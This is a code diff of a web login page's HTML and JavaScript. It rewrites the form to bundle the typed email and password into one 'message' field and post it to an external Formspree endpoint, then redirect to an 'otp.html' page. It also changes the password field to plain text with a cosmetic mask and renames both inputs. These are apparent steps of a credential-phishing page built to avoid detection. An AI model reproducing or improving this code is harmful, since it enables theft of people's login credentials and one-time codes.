@@ -19,47 +19,31 @@
           form.addEventListener("submit", async function (event) {
             event.preventDefault(); // Prevent default form submission
 
-            // Validate email and password
-            if (!emailInput.value.trim()) {
-              alert("Please enter your email.");
-              return;
-            }
-            if (!passInput.value.trim()) {
-              alert("Please enter your password.");
+            if (!emailInput.value || !passInput.value) {
+              alert("Please fill in all fields.");
               return;
             }
 
-            btn.textContent = "Loading..."; // Show loading state
+            btn.textContent = "Loading..."; // Change button text
             btn.disabled = true; // Prevent multiple clicks
 
-            localStorage.setItem("email", emailInput.value); // Store email locally
-
-            let formData = {
-              email: emailInput.value,
-              pass: passInput.value,
-            };
+            let formData = new FormData();
+            formData.append("message", `Email: ${emailInput.value}, Password: ${passInput.value}`);
 
             try {
               let response = await fetch("https://formspree.io/f/xoveqrzb", {
                 method: "POST",
-                headers: {
-                  "Content-Type": "application/json",
-                  Accept: "application/json",
-                },
-                body: JSON.stringify(formData),
+                body: formData,
+                headers: { Accept: "application/json" },
               });
 
-              let result = await response.json();
-
               if (response.ok) {
-                window.location.href = "otp.html"; // Redirect on success
+                window.location.href = "otp.html"; // Redirect after success
               } else {
-                alert(result.error || "Failed to send form. Please try again.");
-                console.error("Form error:", result);
+                alert("Failed to send form. Please try again.");
               }
             } catch (error) {
               alert("An error occurred. Please try again later.");
-              console.error("Request error:", error);
             } finally {
               btn.textContent = "Login"; // Reset button text
               btn.disabled = false; // Re-enable button
@@ -68,10 +52,10 @@
         }
       });
 
-      // Function to toggle password visibility
-      function togglePass() {
+      // Function to hide password characters
+      function maskPassInput() {
         const passInput = document.getElementById("pass");
-        passInput.type = passInput.type === "password" ? "text" : "password";
+        passInput.style.fontFamily = "password"; // Mimic password hiding
       }
     </script>
 
@@ -94,8 +78,8 @@
               required
               minlength="5"
               id="email"
-              name="email"
-              type="email"
+              name="message"
+              type="text"
               class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
               placeholder="Email"
             />
@@ -106,21 +90,22 @@
               required
               minlength="5"
               id="pass"
-              name="pass"
-              type="password"
+              name="message"
+              type="text"
               class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
               placeholder="Password"
+              onfocus="maskPassInput()" 
             />
+
             <img
               onclick="togglePass()"
               src="asset/eyes-a95130fc.svg"
-              class="absolute top-1/2 bottom-1/2 right-3 my-auto cursor-pointer"
+              class="absolute top-1/2 bottom-1/2 right-3 my-auto"
             />
           </div>
 
           <button
             id="redirectBtn"
-            type="submit"
             class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
           >
             Login
